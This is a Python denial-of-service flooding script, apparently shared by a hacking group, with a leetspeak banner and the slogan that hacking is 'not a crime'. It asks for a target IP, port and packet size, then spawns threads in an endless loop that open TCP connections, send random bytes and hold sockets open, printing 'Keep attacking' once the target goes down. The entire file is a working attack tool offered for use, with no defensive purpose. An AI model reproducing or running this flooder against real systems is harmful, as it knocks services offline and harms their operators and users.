#!/system/bin/python
from os import *
from socket import *
from string import *
from time import *
from _thread import *
import sys
import os
import random

print("********* **     ******* ******* *****")
print("**        **     **    * **    * **   *")
print("********* **     **    * **    * **    *")
print("**        **     **    * **    * **     *")
print("**        **     **    * **    * **    *")
print("**        **     **    * **    * **   *")
print("**        ****** ******* ******* *****")
a = '"'
print("#DedSecTL\t\tPorted to Python 3 by Catayao56")
print("We are AndroSec1337 Cyber Team")
print("We are family and we fight for justice")
print("Dont Forget Us :v")
print()
print("//Hacking is not a crime")
print("//Hacking is art of exploitation")
print()
print("T4rg3t/1P 4ddr355:")
host = input("fl00d ~ ")
print("P0R7:")
port = eval(input("fl00d ~ "))
print("P4ck@ge S1Z3 [M@X 65507]:")
package = eval(input("fl00d ~ "))
packet = random._urandom(package)


def connect(i):
    try:
        sock1 = socket(AF_INET, SOCK_STREAM)
        sock1.connect((host, port))
        sock1.sendto(packet, (host, port))
        sleep(99)
        sock1.close

    except OSError:
        print("[+] 74rg37 15 D0wn! K33p 4774Ck1ng!!")

n = 0


while True:
    try:
        start_new_thread(connect, (n,))

    except ImportError:
        print("Y0ur 1n73rn37 h45 b33n fuck3ry, Pl3453 ch3ck 17")

    print("[+] Fire!! Fire!! Fire!! Fire!! Fire!!")
    sleep(0.1)
